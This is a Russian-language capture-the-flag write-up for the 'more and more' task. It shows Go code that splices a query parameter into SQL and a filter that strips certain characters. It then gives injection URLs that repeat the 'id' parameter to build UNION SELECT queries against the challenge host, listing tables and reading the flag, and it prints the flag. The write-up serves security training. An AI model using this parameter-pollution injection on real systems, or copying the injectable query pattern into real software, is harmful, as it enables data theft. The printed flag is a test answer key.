# more and more

Смотрим исходники, замечаем sql-инъекцию
```
id := strings.Join(validate(r.URL.Query()["id"]), " ")
query := fmt.Sprintf("SELECT note FROM notes WHERE id = %s", id)
```
Также обращаем внимание на довольно странный фильтр в функции validate
```
func validate(words []string) (res []string) {
	for _, w := range words {
		w = strings.ReplaceAll(w, "\n", "")
		w = strings.ReplaceAll(w, " ", "")
		w = strings.ReplaceAll(w, "\r", "")
		w = strings.ReplaceAll(w, "\t", "")
		w = strings.ReplaceAll(w, "+", "")
		w = strings.ReplaceAll(w, "%2b", "")
		w = strings.ReplaceAll(w, "%2B", "")
		w = strings.ReplaceAll(w, "%20", "")
		w = strings.ReplaceAll(w, "%5c%6e", "")
		w = strings.ReplaceAll(w, "%5c%6E", "")
		w = strings.ReplaceAll(w, "%5C%6E", "")
		w = strings.ReplaceAll(w, "%5C%6e", "")
		w = strings.ReplaceAll(w, "%5c%74", "")
		w = strings.ReplaceAll(w, "%5C%74", "")
		w = strings.ReplaceAll(w, "%5C%72", "")
		w = strings.ReplaceAll(w, "%5c%72", "")
		w = strings.ReplaceAll(w, "id", "")
		w = strings.ReplaceAll(w, "/", "")
		w = strings.ReplaceAll(w, "*", "")
		w = strings.ReplaceAll(w, "%2A", "")
		w = strings.ReplaceAll(w, "%2F", "")
		w = strings.ReplaceAll(w, "%2a", "")
		w = strings.ReplaceAll(w, "%2f", "")
		w = strings.ReplaceAll(w, "%09", "")
		w = strings.ReplaceAll(w, "%0A", "")
		w = strings.ReplaceAll(w, "%0a", "")
		w = strings.ReplaceAll(w, "%0C", "")
		w = strings.ReplaceAll(w, "%0c", "")
		w = strings.ReplaceAll(w, "%0D", "")
		w = strings.ReplaceAll(w, "%0d", "")

        res = append(res, w)
	}
	return

```

Если присмотреться, можно заметить, что функция не фильтрует слова и цифры.
Ещё раз смотрим в код на go и замечаем, что r.URL.Query() возвращает тип данных map[string][]string, пример
```
r.URL.Query() == map[string][]string{
    "id": {"1"},
}
```
соответственно r.URL.Query()["id"] вернёт 
```
[]string{"1"}
```
Но что если мы укажем несколько параметров id
```
d=1&id=2&id=3

```
```
r.URL.Query() == map[string][]string{
    "id": {"1", "2", "3"},
}

r.URL.Query()["id"]

```
```
[]string{"1", "2", "3"}
```
В конце Join склеит всё в одну строку и передаст в sql запрос

---
Теперь понятно как можно внедрить sql иньекции в данном запросе, начнём с перечисления всех таблиц
```
more-and-more.tasks.2025.ctf.cs.msu.ru/get-by-id?id=1&id=UNION&id=SELECT&id=table_name&id=FROM&id=information_schema.tables
```
из большого вывода нас интересует только
```
180	"flag"
```
Читаем флаг
```
http://more-and-more.tasks.2025.ctf.cs.msu.ru/get-by-id?id=1&id=UNION&id=SELECT&id=flag&id=FROM&id=flag

```
```
"MSKCTF{y0u_must_n3v3r_f0rget_ab0ut_http_p4r4m3t3r_p011t10n}"
```

---
# Flag: MSKCTF{y0u_must_n3v3r_f0rget_ab0ut_http_p4r4m3t3r_p011t10n} 

